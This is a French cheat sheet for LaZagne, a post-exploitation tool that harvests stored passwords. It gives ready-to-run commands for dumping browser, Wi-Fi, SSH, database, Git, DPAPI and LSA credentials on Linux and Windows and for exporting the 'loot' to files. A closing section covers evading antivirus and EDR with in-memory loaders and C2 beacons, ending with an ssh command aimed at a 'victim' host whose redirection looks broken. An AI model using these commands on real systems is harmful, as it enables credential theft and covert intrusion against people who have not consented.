<!-- language-home-navigation -->
[🏠 Page d'accueil Française](../../README.fr.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇮🇹 Italiano](README.it.md)

[🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# Aide-mémoire LaZagne

[LaZagne](https://github.com/AlessandroZ/LaZagne) est une application open source de post-exploitation utilisée pour récupérer les mots de passe stockés sur un ordinateur local. Il prend en charge Windows, Linux et macOS dans plusieurs catégories, notamment les navigateurs Web, les clients de messagerie, les réseaux Wi-Fi, les logiciels de gestion de bases de données, les outils d'administration système et les caches mémoire.

---

## Table des matières

- [Modules et catégories pris en charge](#supported-modules--categories)
- [Installation et binaires](#installation--binaires)
- [Récolte des informations d'identification Linux](#linux-credential-harvesting)
- [Récolte des informations d'identification Windows](#windows-credential-harvesting)
- [Attaques de catégorie ciblées](#attaques de catégorie ciblée)
- [Formats de sortie et exportation de fichiers](#output-formats--file-export)
-[Sécurité opérationnelle et évitement EDR](#opérationnel-sécurité--edr-évitement)

---

## Modules et catégories pris en charge

LaZagne extrait les informations d'identification de dizaines d'applications regroupées en catégories :
- **Navigateurs :** Chrome, Firefox, Edge, Opera, Brave, Chromium (historique, remplissage automatique, cookies, informations d'identification).
- **Outils Sysadmin :** WinSCP, PuTTY, OpenSSH (clés / configuration `id_rsa`), RDP / mstsc, FileZilla, Cyberduck, VNC.
- **Bases de données :** DBeaver, pgAdmin, Squirrel, Robomongo, SQL Server Management Studio.
- **Wi-Fi :** Clés pré-partagées WPA2/WPA3 (PSK) stockées dans les profils réseau du système d'exploitation.
- **Développeur et VCS :** Informations d'identification Git (`.git-credentials`, cache), SVN, jetons Docker, informations d'identification AWS CLI.
- **E-mail et chat :** Thunderbird, Outlook, Pidgin, Skype.
- **Windows Vault et DPAPI :** secrets LSA, clés principales DPAPI, éléments du coffre-fort Credential Manager.

---

## Installation et binaires
```bash
# Clone the repository
git clone https://github.com/AlessandroZ/LaZagne.git
cd LaZagne

# Install Python dependencies (for running source on Linux)
pip install -r requirements.txt

# Or download pre-compiled standalone binaries (releases page)
# Windows: lazagne.exe
# Linux: laZagne.py
```
---

## Récolte d'informations d'identification Linux

### 1. Exécutez tous les modules d'extraction
```bash
python3 laZagne.py all
```
### 2. Exécuter avec les privilèges Root / Sudo (étend l'accès Shadow et Keyring)
L'exécution sous `root` déverrouille les secrets du système, les profils Wi-Fi dans `/etc/NetworkManager` et les clés SSH dans tous les répertoires `/home/*` :
```bash
sudo python3 laZagne.py all
```
### 3. Extraire les mots de passe du trousseau Gnome / KWallet
```bash
python3 laZagne.py sysadmin -k
```
---

## Récolte des informations d'identification Windows

Sous Windows, utilisez l'exécutable autonome `lazagne.exe` :

### 1. Extraire tous les mots de passe stockés
```cmd
lazagne.exe all
```
### 2. Exécuter avec des privilèges élevés (Administrateur / SYSTÈME)
Extrayez les clés principales DPAPI, les secrets LSA et les informations d'identification de domaine mises en cache :
```cmd
lazagne.exe all -v
```
### 3. Extraire les mots de passe d'un utilisateur spécifique (lors de l'exécution en tant qu'administrateur)
```cmd
lazagne.exe all -path "C:\Users\TargetUser\AppData"
```
---

## Attaques de catégorie ciblées

Au lieu d'exécuter tous les modules, spécifiez les catégories de logiciels cibles pour minimiser l'activité du disque et le bruit :

### 1. Navigateurs Web uniquement
```bash
# Linux
python3 laZagne.py browsers

# Windows
lazagne.exe browsers
```
### 2. Mots de passe Wi-Fi en texte clair
```bash
# Linux (requires root or sudo)
sudo python3 laZagne.py wifi

# Windows
lazagne.exe wifi
```
### 3. Outils d'administration système et d'accès à distance (SSH, RDP, WinSCP, FileZilla)
```bash
# Linux
python3 laZagne.py sysadmin

# Windows
lazagne.exe sysadmin
```
### 4. Clients de base de données
```bash
# Linux
python3 laZagne.py databases

# Windows
lazagne.exe databases
```
### 5. Informations d'identification du développeur et Git
```bash
# Linux
python3 laZagne.py git
```
---

## Formats de sortie et exportation de fichiers

Enregistrez les informations d'identification collectées directement sur le disque dans des formats structurés :

### Exporter au format JSON
```bash
python3 laZagne.py all -oJ -oN /tmp/loot_credentials
```
Crée `/tmp/loot_credentials.json` contenant des informations d'identification structurées, des URL, des noms d'utilisateur et des mots de passe en texte brut.

### Exporter vers du texte brut
```bash
python3 laZagne.py all -oT -oN /tmp/loot_credentials
```
Crée `/tmp/loot_credentials.txt`.

---

## Sécurité opérationnelle et évitement EDR

- **Détection antivirus :** Le `lazagne.exe` autonome est fortement signé par Windows Defender et les solutions EDR commerciales.
- **Obfuscation et exécution en mémoire :**
  - Exécuter via la réflexion PowerShell ou des chargeurs en mémoire (`donut`, `execute-assembly` dans Cobalt Strike / Sliver).
  - Utilisez la version source de Python avec un environnement virtuel personnalisé plutôt que le binaire PyInstaller compressé.
- **Nettoyer les artefacts :** Supprimez les fichiers de butin temporaires ou redirigez la sortie directement via la sortie standard via une balise C2 cryptée ou une session SSH :
  ```bash
  ssh victim@192.168.1.50 'python3 -' < laZagne.py all
  ```